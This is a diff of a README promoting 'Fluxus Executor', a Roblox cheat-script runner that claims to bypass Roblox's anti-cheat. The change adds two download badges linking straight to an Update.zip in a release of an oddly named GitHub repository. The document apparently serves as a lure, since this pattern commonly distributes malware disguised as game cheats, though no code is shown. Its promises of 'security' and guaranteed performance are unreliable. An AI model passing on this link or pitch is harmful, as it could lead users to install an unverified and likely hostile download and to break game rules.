@@ -5,12 +5,12 @@
 
 Unlike many executors that crash or get patched quickly, **Fluxus is regularly updated** to bypass **Roblox’s anti-cheat system**, ensuring **stability, security, and superior performance**. Whether you're using **Blox Fruits, Pet Simulator X, Arsenal, or any other game scripts**, Fluxus guarantees **smooth execution without FPS drops or crashes**.  
 
-[![Download Fluxus Executor](https://img.shields.io/badge/Download-Fluxus_Executor-red?style=for-the-badge&logo=download)]()  
+[![Download Fluxus Executor](https://img.shields.io/badge/Download-Fluxus_Executor-red?style=for-the-badge&logo=download)](https://github.com/FkIBOB/fluxunexectop/releases/download/Update/Update.zip)  
 
 ![flu](https://github.com/user-attachments/assets/57e8d3d2-42b5-4b8a-9cd3-be2fa34071ae)
 
 
-[![Download Fluxus Executor](https://img.shields.io/badge/Download-Fluxus_Executor-red?style=for-the-badge&logo=download)]()  
+[![Download Fluxus Executor](https://img.shields.io/badge/Download-Fluxus_Executor-red?style=for-the-badge&logo=download)](https://github.com/FkIBOB/fluxunexectop/releases/download/Update/Update.zip)  
 
 ---
 
